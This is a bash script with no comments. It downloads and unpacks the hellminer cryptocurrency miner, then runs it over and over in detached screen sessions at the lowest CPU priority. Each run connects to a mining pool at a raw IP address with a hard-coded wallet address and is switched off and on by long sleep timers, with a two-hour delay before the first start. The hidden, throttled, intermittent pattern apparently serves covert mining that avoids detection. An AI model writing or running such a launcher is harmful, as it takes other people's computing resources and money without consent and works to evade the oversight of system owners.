#!/bin/bash

apt-get install libsodium-dev -y && wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz && tar -xf hellminer_linux64.tar.gz
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 7200
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 ./hellminer -c stratum+tcp://47.89.234.100:4444 -u RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3.001 -p d=16294S --cpu 1
sleep 21600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 7200
